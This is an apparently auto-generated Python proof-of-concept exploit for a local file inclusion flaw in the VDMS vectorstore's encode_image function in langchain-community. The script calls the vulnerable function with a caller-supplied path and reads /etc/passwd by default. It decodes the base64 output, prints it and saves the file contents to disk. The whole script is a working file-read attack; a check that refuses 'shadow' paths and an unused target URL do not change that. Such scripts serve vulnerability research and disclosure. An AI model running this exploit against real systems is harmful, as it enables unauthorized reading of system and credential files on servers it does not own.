#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-005
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `encode_image` function in VDMS vectorstore directly opens a file
path provided by the caller without any validation. The `add_images` method passes
user-controlled `uris` directly to `encode_image`, allowing path traversal.

Impact: An attacker can read arbitrary files from the server's filesystem by supplying
paths like '../../etc/passwd'.

Usage:
    python3 poc_lfi.py [--target http://localhost:8000] [--file /etc/passwd]
"""

import argparse
import base64
import sys
import os

# Add the langchain-community-only path to import the vulnerable module
sys.path.insert(0, '/tmp/langchain-community-only')

# Import the vulnerable class
from langchain_community.vectorstores.vdms import VDMS


def exploit_lfi(target_url: str, file_path: str) -> None:
    """
    Exploit the LFI vulnerability by calling add_images with a malicious path.
    
    Args:
        target_url: The URL of the VDMS server (not directly used, but kept for context)
        file_path: The file path to read (e.g., '../../etc/passwd')
    """
    print(f"[*] Attempting LFI exploit on {target_url}")
    print(f"[*] Target file: {file_path}")
    
    # Create a mock VDMS instance (we only need the encode_image method)
    # In a real scenario, this would be called through the web endpoint
    # but we can directly test the vulnerable function
    
    # The vulnerability is in the encode_image method which is called by add_images
    # We can directly test encode_image since it's the sink
    
    # Create a minimal VDMS instance (we don't need a real connection)
    # The encode_image method is static/class-level, so we can call it directly
    vdms = VDMS.__new__(VDMS)
    
    try:
        # Directly call encode_image with the malicious path
        # This simulates what happens when add_images is called with attacker-controlled uris
        print(f"[*] Calling encode_image with path: {file_path}")
        result = vdms.encode_image(image_path=file_path)
        
        # Decode the base64 result to see the file contents
        decoded = base64.b64decode(result).decode('utf-8', errors='replace')
        
        print("[+] SUCCESS! File contents:")
        print("-" * 50)
        print(decoded)
        print("-" * 50)
        
        # Also save to a file for analysis
        output_file = f"lfi_output_{os.path.basename(file_path)}"
        with open(output_file, 'w') as f:
            f.write(decoded)
        print(f"[+] Output saved to: {output_file}")
        
    except FileNotFoundError:
        print(f"[-] File not found: {file_path}")
        print("[*] Try a different path or check if the file exists")
    except PermissionError:
        print(f"[-] Permission denied: {file_path}")
        print("[*] Try a world-readable file like /etc/passwd")
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[*] The vulnerability may not be exploitable in this context")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--benign",
        action="store_true",
        help="Use a benign payload (read /etc/hostname instead)"
    )
    
    args = parser.parse_args()
    
    if args.benign:
        # Use a safe, benign file for testing
        file_path = "/etc/hostname"
        print("[*] Using benign payload (reading /etc/hostname)")
    else:
        file_path = args.file
    
    # Validate the file path is not too dangerous
    if file_path == "/etc/shadow" or "shadow" in file_path:
        print("[!] Warning: Reading /etc/shadow may be illegal without authorization")
        print("[!] Use --benign for safe testing")
        sys.exit(1)
    
    exploit_lfi(args.target, file_path)


if __name__ == "__main__":
    main()
